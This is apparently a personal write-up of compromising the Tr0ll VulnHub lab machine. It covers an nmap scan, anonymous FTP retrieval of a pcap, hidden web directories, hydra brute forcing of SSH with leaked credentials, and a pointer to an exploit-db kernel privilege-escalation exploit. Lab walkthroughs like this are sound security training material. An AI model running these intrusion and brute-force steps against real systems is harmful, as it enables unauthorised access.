Nmap Scan

```
# Nmap 7.40 scan initiated Thu Aug  3 20:58:47 2017 as: nmap -sC -sV -oA nmap 192.168.8.102
Nmap scan report for 192.168.8.102
Host is up (0.0035s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  3 20:59:07 2017 -- 1 IP address (1 host up) scanned in 19.95 seconds
```

There are 3 open ports in tr0ll vm

* port 21
* port 22
* port 80

Since the port 80 is open, I have an idea now that the vulnerable machine has a web server running. So I opened my web browser and visit the IP address of the machine.

![](/assets/Screenshot from 2017-08-07 14-59-21.png)

So this is the first thing that I saw.

I tried to see if it has a robots.txt in the root of the web server and it showed me this.

![](/assets/Screenshot from 2017-08-07 15-02-06.png)

There is a folder called secret and showed me this.

![](/assets/Screenshot from 2017-08-07 15-03-20.png)Continuing my enumeration, I saw that the FTP server allows anonymous login, so I fired up my Filezilla and browse the FTP server. There is a file there named lol.pcap. Pcap is a file that contains the captured network traffics from network analyzers such as Wireshark and some other tools. So to open the pcap file, I launched Wireshark and read the pcap file. It showed me this.

![](/assets/Screenshot from 2017-08-03 21-37-00.png)

I noticed the "sup3rs3cr3tdirlol" and tried to open it and voila.

![](/assets/Screenshot from 2017-08-07 15-13-36.png)

I downloaded the file named roflmao then run the file command to determine the filetype of the downloaded file. It shows that it is an ELF 32-bit LSB executable.

```
kaipowered@debian:~/Documents/Vulnhub/tr0ll$ file roflmao 
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
```

So the next thing I did was to run the gdb then run the executable file.

```
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from roflmao...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/kaipowered/Documents/Vulnhub/tr0ll/roflmao 
Find address 0x0856BF to proceed[Inferior 1 (process 10058) exited with code 040]
(gdb)
```

The output showed me this

```
Find address 0x0856BF to proceed[Inferior 1 (process 10058) exited with code 040]
```

I tried to find the said address but I wasn't able to find it in the memory, so I tried opening it on the web browser and it appears that it is a directory on the web server.

![](/assets/Screenshot from 2017-08-07 15-24-34.png)I downloaded the files from the directories and it appears that the contents of the files were usernames and passwords.

There was only one service that I haven't checked, and that was the ssh.

The next thing I did was to brute force the ssh service with the given usernames and passwords.

```
hydra -L which_one_lol.txt -P Pass.txt 192.168.8.102
```

At first, the usernames and passwords combination did not work, so it was a little frustrating.

```
hydra -L which_one_lol.txt -p Pass.txt 192.168.8.102
```

But it appears that the real password is the "Pass.txt", so I just changed the option from -P to -p, meaning, with the given password, try the usernames from which\_one\_lol.txt to match the correct combinations with hydra.

After bruteforcing, I was able to get the username and password of the machine.

```
username: overflow
password: Pass.txt
```

```
kaipowered@debian:~/Documents/Vulnhub/tr0ll$ ssh overflow@192.168.8.102
overflow@192.168.8.102's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Aug  6 23:35:25 2017 from 192.168.8.2
Could not chdir to home directory /home/overflow: No such file or directory
$
```

The shell timeouts after a few minutes so the first thing that I did was to check the version of the kernel and it appears that the version of the kernel is GNU/Linux 3.13.0-32-generic i686

Next thing I did was to search the exploit-db for the available privilege escalation exploits of the kernel version.

This is the exploit that I used to gain root on the vulnerable machine:

[https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)

